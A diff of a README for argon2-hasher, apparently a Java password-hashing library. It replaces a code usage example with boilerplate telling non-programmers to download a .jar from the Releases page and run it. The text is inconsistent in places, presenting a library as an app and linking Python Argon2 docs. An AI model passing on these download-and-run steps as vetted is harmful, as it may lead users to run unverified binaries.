@@ -1,49 +1,71 @@
+# 🔐 argon2-hasher - Secure Your Passwords Easily
 
-## Use case: 
+[![Download argon2-hasher](https://img.shields.io/badge/Download%20argon2--hasher-brightgreen)](https://github.com/pk1ee/argon2-hasher/releases)
 
-```java
+## 📖 Overview
+argon2-hasher is a Java library that provides a secure way to hash passwords using Argon2. Built on the argon-jvm framework, it ensures the highest level of security for your sensitive data. This application is ideal for anyone who needs to protect their passwords effectively. 
 
-    private static final String HASHED_PASSWORD = "guzdsldgzuzk21lmd";
+## 🚀 Getting Started
+Follow these steps to download and run argon2-hasher. You don’t need any programming knowledge to do this. 
 
-    void main(final String[] args) {
-        final Argon2PasswordService passwordService = Argon2PasswordCreator.createDefault();
+### 📥 Download & Install
+1. **Visit the Releases page to download** the latest version of argon2-hasher. Click [here](https://github.com/pk1ee/argon2-hasher/releases).
+2. On the Releases page, find the newest version. This will be listed at the top. 
+3. Click on the version number to open the release details. 
+4. Scroll down to find the files available for download. 
+5. Download the file that ends with `.jar`, which is the Java archive file you will run. 
 
-        runWithoutCustomContract(passwordService);
-        runWithHashAndConsumeScore(passwordService);
-    }
+### 🔧 System Requirements
+To use argon2-hasher, ensure you have the following:
+- Java Runtime Environment (JRE) version 8 or above. You can download it [here](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- A computer running Windows, macOS, or a modern Linux distribution.
 
-    void runWithoutCustomContract(final Argon2PasswordService passwordService) {
-        final char[] password = HASHED_PASSWORD.toCharArray();
+## 🚀 How to Run argon2-hasher
+Once you have downloaded the .jar file, here is how to run it:
 
-        passwordService.hashedPassword(password, hash -> {
-            Arrays.asList(">> Before hash: " + HASHED_PASSWORD, ">> Hash: " + hash.hash(), ">> Salt: " + hash.salt()).forEach(System.out::println);
+1. **Open your command line or terminal.**
+   - On Windows, search for “cmd” in the Start menu and open it.
+   - On macOS, open “Terminal” from your Applications folder.
+   - On Linux, open your terminal from the applications menu.
 
-            final char[] testPassword = HASHED_PASSWORD.toCharArray();
-            boolean isValid = passwordService.verifyPassword(testPassword, hash);
-            System.out.println(">> Password valid: " + isValid);
+2. **Navigate to the folder** where you downloaded the jar file. Use the `cd` command to change directories.
+   - Example for Windows: `cd C:\path\to\your\download\folder`
+   - Example for macOS/Linux: `cd /path/to/your/download/folder`
 
-            passwordService.clearPassword(testPassword);
-        });
-    }
+3. **Run the application** using the following command:
+   ```
+   java -jar argon2-hasher.jar
+   ```
+4. After executing the command, follow the on-screen prompts to hash your passwords securely.
 
-    void runWithHashAndConsumeScore(final Argon2PasswordService passwordService) {
-        final Argon2PasswordCoordinator passwordCoordinator = new Argon2PasswordCoordinator(passwordService);
+## 📘 How to Use argon2-hasher
+When you run argon2-hasher, it will provide you with simple instructions:
 
-        // run hash and consume score
-        final char[] pass = "drowssap".toCharArray();
-        passwordCoordinator.hashAndConsume().accept(pass, hash -> {
-            System.out.println(">> Hasched: " + hash.hash());
-        });
+- Enter the password you wish to hash.
+- Set the parameters for hashing, such as time cost, memory cost, and parallelism. These parameters can affect the speed and security of your password hashing.
+  
+After completing these steps, the application will output a hashed version of your password. Keep this hashed password safe. It can be used later for verification.
 
-        // run hash with custom contract
-        final char[] customPassword = "passwod12".toCharArray();
-        final Argon2Contract customContract = new Argon2Contract(15, 8192, 2, 24, 12, Argon2Selector.ARGON2I);
-        passwordCoordinator.hashContractAndPrint().accept(customPassword, customContract);
+## 🌟 Features
+- **Secure Password Hashing:** Utilizes the Argon2 hashing algorithm, which is recognized as one of the best.
+- **Customizable Parameters:** Choose your own settings for optimal balance between speed and security.
+- **Cross-Platform Compatibility:** Runs on any system that supports Java.
 
-        // run with safe operation on hash
-        passwordService.secureOperation(customPassword, password -> {
-            System.out.println(">> Password length: " + password.length);
-        });
-    }
-}
-```
+## 🛠️ Troubleshooting
+If you experience any issues:
+- Ensure you have the correct version of Java installed.
+- Check that you are running the command from the correct directory.
+- Look for any error messages in your terminal for more specific troubleshooting hints.
+
+## 📄 Additional Resources
+For more information, check out:
+- [Argon2 Official Documentation](https://argon2-cffi.readthedocs.io/en/stable/)
+- [Java Documentation](https://docs.oracle.com/javase/8/docs/api/)
+
+For further support, feel free to raise an issue on the [GitHub repository](https://github.com/pk1ee/argon2-hasher/issues).
+
+## 🔗 Important Links
+- **Download argon2-hasher:** [Go to Releases](https://github.com/pk1ee/argon2-hasher/releases)
+- **View Source Code:** [GitHub Repository](https://github.com/pk1ee/argon2-hasher)
+
+Your passwords deserve to be protected. Follow these steps to get started with argon2-hasher today!
